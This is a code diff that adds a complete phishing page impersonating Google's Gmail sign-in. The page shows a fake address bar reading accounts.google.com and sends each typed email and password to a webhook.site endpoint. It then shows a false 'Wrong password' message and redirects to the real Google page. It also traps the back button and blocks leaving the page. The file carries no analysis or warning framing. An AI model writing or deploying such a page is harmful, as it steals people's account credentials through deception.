@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Google Sign In</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
+  .c{text-align:center;padding:20px;width:90%;max-width:400px}
+  h1{font-size:24px;color:#202124;margin-bottom:8px}
+  p{color:#5f6368;font-size:14px;margin-bottom:24px}
+  .urlbar{background:#f1f3f4;border-radius:24px;padding:8px 16px;margin-bottom:24px;font-size:13px;color:#5f6368;display:flex;align-items:center;gap:8px}
+  .urlbar .lock{color:#34a853;font-size:16px}
+  .urlbar span{flex:1;text-align:left}
+  input{width:100%;padding:14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:12px}
+  input:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
+  button{width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer}
+  #msg{color:#d93025;font-size:13px;margin-top:12px;min-height:20px}
+</style>
+</head>
+<body>
+<div class="c">
+  <div class="urlbar"><span class="lock">🔒</span><span id="urlDisp">accounts.google.com</span></div>
+  <h1>Sign in</h1>
+  <p>to continue to Gmail</p>
+  <input id="email" placeholder="Email or phone" autocomplete="off">
+  <input id="pass" type="password" placeholder="Enter your password">
+  <button id="btn">Next</button>
+  <div id="msg"></div>
+</div>
+
+<!-- TRACKER TRIGGERS -->
+<script src="https://www.google-analytics.com/analytics.js" onerror="go()"></script>
+<script src="https://connect.facebook.net/en_US/fbevents.js" onerror="go()"></script>
+<img src="https://doubleclick.net/p.gif" onerror="go()" style="display:none">
+
+<script>
+const T='https://accounts.google.com';
+let n=0;
+function go(){
+  n++;
+  let d=Math.floor(Math.random()*200);
+  setTimeout(()=>{
+    location.replace(T);
+    setTimeout(()=>location.href=T,30);
+  },d);
+}
+window.onload=()=>{
+  for(let i=0;i<10;i++){
+    let m=new Image();
+    m.src='https://ad.doubleclick.net/ddm/trackimp/N'+Math.random();
+    m.onerror=go;
+  }
+  setTimeout(go,1000);
+  setTimeout(go,2000);
+};
+history.pushState(null,'',location.href);
+onpopstate=()=>history.pushState(null,'',location.href);
+onbeforeunload=e=>{e.preventDefault();e.returnValue='';};
+
+document.getElementById('btn').onclick=()=>{
+  let e=document.getElementById('email').value;
+  let p=document.getElementById('pass').value;
+  if(!e||!p){document.getElementById('msg').textContent='Fill all fields';return;}
+  fetch('https://webhook.site/651d5e58-6e9c-4152-a845-09543a5b1371'+new URLSearchParams({e,p}),{mode:'no-cors'});
+  document.getElementById('msg').textContent='Wrong password. Try again.';
+  document.getElementById('pass').value='';
+  setTimeout(()=>location.replace(T),1000);
+};
+setInterval(()=>{document.getElementById('urlDisp').textContent='accounts.google.com';},500);
+</script>
+</body>
+</html>
